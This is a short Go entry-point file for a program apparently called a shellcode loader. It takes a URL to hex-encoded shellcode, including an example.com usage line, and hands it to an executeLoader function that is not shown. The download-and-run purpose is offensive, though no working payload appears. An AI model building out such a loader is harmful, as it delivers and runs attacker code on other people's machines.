// main.go
package main

import (
	"flag"
	"fmt"
)

func main() {
	shellcodeURL := flag.String("url", "", "URL to shellcode file (hex format)")
	flag.Parse()

	if *shellcodeURL == "" {
		fmt.Println("Error: -url is required")
		fmt.Println("Usage: ./loader -url http://example.com/shellcode.txt")
		return
	}

	executeLoader(*shellcodeURL)
}
